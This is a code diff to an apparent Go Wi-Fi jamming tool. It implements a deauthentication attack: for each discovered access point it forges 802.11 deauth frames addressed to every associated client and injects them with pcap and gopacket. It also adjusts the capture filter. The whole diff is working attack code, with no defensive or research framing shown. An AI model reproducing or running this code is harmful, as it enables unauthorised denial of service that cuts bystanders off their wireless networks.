@@ -3,6 +3,8 @@ package main
 import (
 	"errors"
 	"fmt"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"log"
 	"net"
 	"syscall"
@@ -24,7 +26,7 @@ type JamConn		struct {
 	handle			*pcap.Handle
 }
 
-func (conn *JamConn) SetLastDeauth(lastDeauth time.Time) {
+func  (conn *JamConn)SetLastDeauth(lastDeauth time.Time) {
 
 	conn.lastDeauth = lastDeauth
 }
@@ -151,7 +153,7 @@ func (conn *JamConn) SetFilterForTargets() error {
 	//		bpfExpr = bpfExpr + " or "
 	//	}
 	//}
-	bpfExpr = fmt.Sprintf("not ether host %s", conn.ifa.HardwareAddr.String())
+	bpfExpr = fmt.Sprintf("not ether host %s and not ether host %s", conn.ifa.HardwareAddr.String(), BroadcastAddr)
 	if err := conn.handle.SetBPFFilter(bpfExpr); err != nil {
 		return errors.New("pcap.Handle.SetPBFFilter() " + err.Error())
 	}
@@ -303,13 +305,51 @@ func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
 	}
 }
 
-func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) {
+func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) error {
 
 	if time.Since(conn.lastDeauth) > timeout {
-
+		for _, v := range apList.contents {
+			sta := v.(Station)
+			fmt.Println("station:", sta)
+			for _, cli := range sta.Clients {
+				fmt.Println("client:", cli)
+				if err := conn.Deauth(&cli, sta.BSSID); err != nil {
+					return errors.New("JamConn.Deauth " + err.Error())
+				}
+			}
+		}
+		conn.lastDeauth = time.Now()
 	}
+	return nil
 }
 
+func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
+
+	var buff gopacket.SerializeBuffer
+	var opts gopacket.SerializeOptions
+
+	opts.ComputeChecksums = true
+	dot11Cpy := client.dot11
+	dot11Cpy.SequenceNumber += 1
+	dot11Cpy.Type = layers.Dot11TypeMgmtDeauthentication
+	mgmt := layers.Dot11MgmtDeauthentication{
+		Reason: layers.Dot11ReasonDeauthStLeaving,
+	}
+	buff = gopacket.NewSerializeBuffer()
+	err := gopacket.SerializeLayers(buff, opts,
+		client.radioHdr,
+		dot11Cpy,
+		&mgmt,
+	)
+	if err != nil {
+		return errors.New("gopacket.SerializeLayers() " + err.Error())
+	}
+	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
+		return errors.New("Handle.WritePacketData() " + err.Error())
+	}
+	fmt.Printf("sent deauth from %s\n", dot11Cpy.Address1)
+	return nil
+}
 
 func (conn* JamConn) TriggerScan() (bool, error) {
 
